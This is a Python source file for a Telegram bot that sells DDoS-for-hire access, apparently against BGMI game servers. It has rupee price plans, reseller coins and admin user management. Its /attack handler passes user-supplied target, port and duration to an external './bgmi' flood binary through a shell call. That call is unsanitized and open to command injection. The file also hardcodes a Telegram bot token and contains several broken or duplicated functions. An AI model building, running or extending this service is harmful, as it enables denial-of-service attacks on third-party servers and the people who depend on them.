#script by @dakshstore1

import telebot
import subprocess
import datetime
import os
import time as time_module

from keep_alive import keep_alive
keep_alive()
# insert your Telegram bot token here
bot = telebot.TeleBot('7125146756:AAGEc1B72NAKRIGSSBGC6uSkuGpu-O4xx5Y')

# Admin user IDs
admin_id = ["757915155", "5056902784"]

# Assuming CHANNEL_ID is defined globally
CHANNEL_ID = '-1002464533692'  # Replace with your actual channel ID or username

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass

# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    admin_id = ["757915155"]
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found ❌."
            else:
                file.truncate(0)
                response = "Logs cleared successfully ✅"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

import datetime

# Dictionary to store the approval expiry date for each user
user_approval_expiry = {}

# Function to calculate remaining approval time
def get_remaining_approval_time(user_id):
    expiry_date = user_approval_expiry.get(user_id)
    if expiry_date:
        remaining_time = expiry_date - datetime.datetime.now()
        if remaining_time.days < 0:
            return "Expired"
        else:
            return str(remaining_time)
    else:
        return "N/A"

# Function to add or update user approval expiry date
def set_approval_expiry_date(user_id, duration, time_unit):
    current_time = datetime.datetime.now()
    if time_unit == "hour" or time_unit == "hours":
        expiry_date = current_time + datetime.timedelta(hours=duration)
    elif time_unit == "day" or time_unit == "days":
        expiry_date = current_time + datetime.timedelta(days=duration)
    elif time_unit == "week" or time_unit == "weeks":
        expiry_date = current_time + datetime.timedelta(weeks=duration)
    elif time_unit == "month" or time_unit == "months":
        expiry_date = current_time + datetime.timedelta(days=30 * duration)  # Approximation of a month
    else:
        return False
    
    user_approval_expiry[user_id] = expiry_date
    return True

# Command handler for adding a user with approval time
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 2:
            user_to_add = command[1]
            duration_str = command[2]

            try:
                duration = int(duration_str[:-4])  # Extract the numeric part of the duration
                if duration <= 0:
                    raise ValueError
                time_unit = duration_str[-4:].lower()  # Extract the time unit (e.g., 'hour', 'day', 'week', 'month')
                if time_unit not in ('hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months'):
                    raise ValueError
            except ValueError:
                response = "Invalid duration format. Please provide a positive integer followed by 'hour(s)', 'day(s)', 'week(s)', or 'month(s)'."
                bot.reply_to(message, response)
                return

            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                if set_approval_expiry_date(user_to_add, duration, time_unit):
                    response = f"User {user_to_add} added successfully for {duration} {time_unit}. Access will expire on {user_approval_expiry[user_to_add].strftime('%Y-%m-%d %H:%M:%S')} 👍."
                else:
                    response = "Failed to set approval expiry date. Please try again later."
            else:
                response = "User already exists 🤦‍♂️."
        else:
            response = "Please specify a user ID and the duration (e.g., 1hour, 2days, 3weeks, 4months) to add 😘."
    else:
        response = "You have not purchased yet purchase now from:- BOT OWNER 🙏."

    bot.reply_to(message, response)

# Command handler for retrieving user info
@bot.message_handler(commands=['myinfo'])
def get_user_info(message):
    user_id = str(message.chat.id)
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else "N/A"
    user_role = "Admin" if user_id in admin_id else "User"
    remaining_time = get_remaining_approval_time(user_id)
    response = f"👤 Your Info:\n\n🆔 User ID: <code>{user_id}</code>\n📝 Username: {username}\n🔖 Role: {user_role}\n📅 Approval Expiry Date: {user_approval_expiry.get(user_id, 'Not Approved')}\n⏳ Remaining Approval Time: {remaining_time}"
    bot.reply_to(message, response, parse_mode="HTML")



@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully 👍."
            else:
                response = f"User {user_to_remove} not found in the list ❌."
        else:
            response = '''Please Specify A User ID to Remove. 
✅ Usage: /remove <userid>'''
    else:
        response = "You have not purchased yet purchase now from:- @BOT OWNER 🙇."

    bot.reply_to(message, response)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found ❌."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully ✅"
        except FileNotFoundError:
            response = "Logs are already cleared ❌."
    else:
        response = "You have not purchased yet purchase now from :- @BOT OWNER."
    bot.reply_to(message, response)


@bot.message_handler(commands=['clearusers'])
def clear_users_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "USERS are already cleared. No data found ❌."
                else:
                    file.truncate(0)
                    response = "users Cleared Successfully ✅"
        except FileNotFoundError:
            response = "users are already cleared ❌."
    else:
        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- BOT OWNER 🙇."
    bot.reply_to(message, response)
 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found ❌"
        except FileNotFoundError:
            response = "No data found ❌"
    else:
        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- BOT OWNER."
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found ❌."
                bot.reply_to(message, response)
        else:
            response = "No data found ❌"
            bot.reply_to(message, response)
    else:
        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- BOT OWNER."
        bot.reply_to(message, response)


# Function to handle the reply when free users run the /attack command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: VIP- User of ATTACK"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /attack command
attack_cooldown = {}

COOLDOWN_TIME =60

def start_attack_reply(message, target, port, attack_time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name

    # Check if the user is on cooldown
    current_time = time_module.time()
    last_command_time = attack_cooldown.get(user_info.id, 0)

    # If the user is on cooldown, reply with the remaining cooldown time
    if current_time - last_command_time < COOLDOWN_TIME:
        remaining_time = COOLDOWN_TIME - (current_time - last_command_time)
        response = f"{username}, please wait {int(remaining_time)} more seconds before using the /attack command again."
        bot.reply_to(message, response)
    else:
        # Update the cooldown timestamp for the user
        attack_cooldown[user_info.id] = current_time

        # Proceed with starting the attack
        response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {attack_time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: VIP- User of ATTACK"
        bot.reply_to(message, response)

        # Send the attack start notification to the channel
        send_notification_to_channel(username, target, port, attack_time)

# Function to send a notification to the channel
def send_notification_to_channel(username, target, port, attack_time):
    message = (
        f"🔔 *ATTACK STARTED:*\n"
        f"👤 *User:* @{username}\n"
        f"🎯 *Target:* {target}\n"
        f"🌐 *Port:* {port}\n"
        f"⏱️ *Attack Time:* {attack_time} seconds."
    )

    # Send the message to the channel (make sure CHANNEL_ID is defined)
    bot.send_message(
        CHANNEL_ID,  # Replace CHANNEL_ID with the actual channel ID
        message,
        parse_mode='Markdown'
    )

# Dictionary to track attack cooldown per user
attack_cooldown = {}

# Set cooldown time in seconds
COOLDOWN_TIME = 180

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    user_id = str(message.chat.id)

    # Check if user is allowed
    if user_id in allowed_user_ids:
        current_time = time_module.time()

        # Check if user is in cooldown period
        if user_id in attack_cooldown and (current_time - attack_cooldown[user_id] < COOLDOWN_TIME):
            remaining_time = int(COOLDOWN_TIME - (current_time - attack_cooldown[user_id]))
            bot.reply_to(message, f"⏳ You are on cooldown! Please wait {remaining_time} seconds before attacking again.")
            return

        command = message.text.split()
        if len(command) == 4:
            target = command[1]
            port = int(command[2])
            attack_time = int(command[3])

            if attack_time > 240:
                bot.reply_to(message, "❌ Error: Attack time must be less than 240 seconds.")
                return

            # Update cooldown timestamp
            attack_cooldown[user_id] = current_time

            record_command_logs(user_id, '/attack', target, port, attack_time)
            log_command(user_id, target, port, attack_time)

            bot.reply_to(message, f"🔥 Attack started!\n🎯 Target: {target}\n🔢 Port: {port}\n⏳ Duration: {attack_time} sec")

            # Run the attack command
            subprocess.run(f"./bgmi {target} {port} {attack_time} 10 1000", shell=True)

            bot.reply_to(message, f"✅ Attack Finished! Target: {target} Port: {port} Time: {attack_time} sec")
        else:
            bot.reply_to(message, "✅ Usage: /attack <target> <port> <time>")
    else:
        bot.reply_to(message, "🚫 Unauthorized Access! DM BOT OWNER to buy access.")

    bot.reply_to(message, response)


# Add /mylogs command to display logs recorded for attack and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "❌ No Command Logs Found For You ❌."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "You Are Not Authorized To Use This Command 😡."

    bot.reply_to(message, response)

@bot.message_handler(commands=['help'])
def show_help(message):
    help_text ='''🤖 Available commands:
💥 /attack : Method For Bgmi Servers. 
💥 /rules : Please Check Before Use !!.
💥 /mylogs : To Check Your Recents Attacks.
💥 /plan : Checkout Our Botnet Rates.
💥 /myinfo : TO Check Your WHOLE INFO.

🤖 To See Admin Commands:
💥 /admincmd : Shows All Admin Commands.

Buy From :- BOT OWNER
Official Channel :- ATTACK KA DDOS ATTACK 
'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.swith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴘʀᴇᴍɪᴜᴍ ᴅᴅᴏs ʙᴏᴛ, {user_name}! ᴛʜɪs ɪs ʜɪɢʜ ǫᴜᴀʟɪᴛʏ sᴇʀᴠᴇʀ ʙᴀsᴇᴅ ᴅᴅᴏs. ᴛᴏ ɢᴇᴛ ᴀᴄᴄᴇss.
🤖Try To Run This Command : /help 
✅BUY :- BOT OWNER'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules ⚠️:

1. Dont Run Too Many Attacks !! Cause A Ban From Bot
2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot.
3. AP LOOG APNA PYAR DHIKAO BOT SHARE KARO OR USE KARO ACHA LAGE TO FEEDBACK DO PLEASE 🙏
4. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:

Vip 🌟 :
-> Attack Time : 300 (S)
> After Attack Limit : 10 sec
-> Concurrents Attack : 5

Pr-ice List💸 :
Day-->199 Rs
Week-->900 Rs
Month-->1600 Rs
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Admin Commands Are Here!!:

💥 /add <userId> : Add a User.
💥 /remove <userid> Remove a User.
💥 /allusers : Authorised Users Lists.
💥 /logs : All Users Logs.
💥 /broadcast : Broadcast a Message.
💥 /clearlogs : Clear The Logs File.
💥 /clearusers : Clear The USERS File.
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "⚠️ Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users 👍."
        else:
            response = "🤖 Please Provide A Message To Broadcast."
    else:
        response = "Only Admin Can Run This Command 😡."

    bot.reply_to(message, response)

# Group for reseller notifications
RESELLER_CHANNEL_ID = '-4616371010'

# File to store reseller balances
RESELLER_FILE = "resellers.txt"

# Read resellers and their balances
def read_resellers():
    resellers = {}
    if os.path.exists(RESELLER_FILE):
        with open(RESELLER_FILE, "r") as file:
            for line in file.readlines():
                user_id, coins = line.strip().split()
                resellers[user_id] = int(coins)
    return resellers

# Write resellers to file
def write_resellers(resellers):
    with open(RESELLER_FILE, "w") as file:
        for user_id, coins in resellers.items():
            file.write(f"{user_id} {coins}\n")

resellers = read_resellers()

# Admin adds a reseller
@bot.message_handler(commands=['addreseller'])
def add_reseller(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) == 3:
            reseller_id = command[1]
            coins = int(command[2])
            resellers[reseller_id] = coins
            write_resellers(resellers)
            bot.reply_to(message, f"✅ Reseller {reseller_id} added with {coins} coins.")
        else:
            bot.reply_to(message, "Usage: /addreseller <user_id> <coins>")
    else:
        bot.reply_to(message, "❌ Only admins can add resellers.")

# Admin tops up reseller coins
@bot.message_handler(commands=['topup'])
def topup_coins(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) == 3:
            reseller_id = command[1]
            coins = int(command[2])
            if reseller_id in resellers:
                resellers[reseller_id] += coins
                write_resellers(resellers)
                bot.reply_to(message, f"✅ Added {coins} coins to reseller {reseller_id}.")
            else:
                bot.reply_to(message, "❌ Reseller not found.")
        else:
            bot.reply_to(message, "Usage: /topup <user_id> <coins>")
    else:
        bot.reply_to(message, "❌ Only admins can top up coins.")

# Reseller checks balance
@bot.message_handler(commands=['checkcoins'])
def check_coins(message):
    reseller_id = str(message.chat.id)
    if reseller_id in resellers:
        bot.reply_to(message, f"💰 You have {resellers[reseller_id]} coins left.")
    else:
        bot.reply_to(message, "❌ You are not a reseller.")

# Reseller adds a user with days using /mahakal
@bot.message_handler(commands=['mahakal'])
def add_user_with_days(message):
    reseller_id = str(message.chat.id)
    if reseller_id in resellers:
        command = message.text.split()
        if len(command) == 3:
            user_to_add = command[1]
            days = int(command[2])
            cost = days * 5  # 1 day = 5 coins

            if resellers[reseller_id] >= cost:
                # Add user if not already added
                if user_to_add not in allowed_user_ids:
                    allowed_user_ids.append(user_to_add)
                    with open(USER_FILE, "a") as file:
                        file.write(f"{user_to_add}\n")

                # Deduct coins
                resellers[reseller_id] -= cost
                write_resellers(resellers)

                # Set expiry date
                expiry_date = datetime.datetime.now() + datetime.timedelta(days=days)
                user_approval_expiry[user_to_add] = expiry_date.strftime('%Y-%m-%d %H:%M:%S')

                # Notify the group
                bot.send_message(RESELLER_CHANNEL_ID, f"🔔 Reseller {reseller_id} added user {user_to_add} for {days} days. {cost} coins deducted.")

                bot.reply_to(message, f"✅ User {user_to_add} added for {days} days. {cost} coins deducted. Access expires on {user_approval_expiry[user_to_add]}.")
            else:
                bot.reply_to(message, "❌ Insufficient coins to add user.")
        else:
            bot.reply_to(message, "Usage: /mahakal <user_id> <days>")
    else:
        bot.reply_to(message, "❌ You are not a reseller.")

@bot.message_handler(commands=['resellerfile'])
def send_reseller_file(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:  # Only allow admins
        try:
            with open(RESELLER_FILE, "rb") as file:
                bot.send_document(message.chat.id, file)
        except FileNotFoundError:
            bot.reply_to(message, "❌ Reseller file not found.")
    else:
        bot.reply_to(message, "❌ Only admins can access this file.")


#bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)

